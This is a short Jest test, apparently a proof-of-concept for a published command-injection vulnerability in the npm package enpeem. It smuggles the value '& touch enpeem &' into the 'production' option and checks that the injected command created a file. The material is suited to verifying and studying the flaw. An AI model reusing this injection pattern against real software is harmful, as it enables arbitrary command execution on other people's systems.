//https://snyk.io/vuln/SNYK-JS-ENPEEM-559007
test("Command Injection in enpeem", (done) => {
  expect.assertions(2);
  const root = require("enpeem");
  const fs = require("fs");
  const path = "./enpeem";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch enpeem &";
  let opts = { production: attack_code };
  root.update(opts, function (err) {
    console.log("err!");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
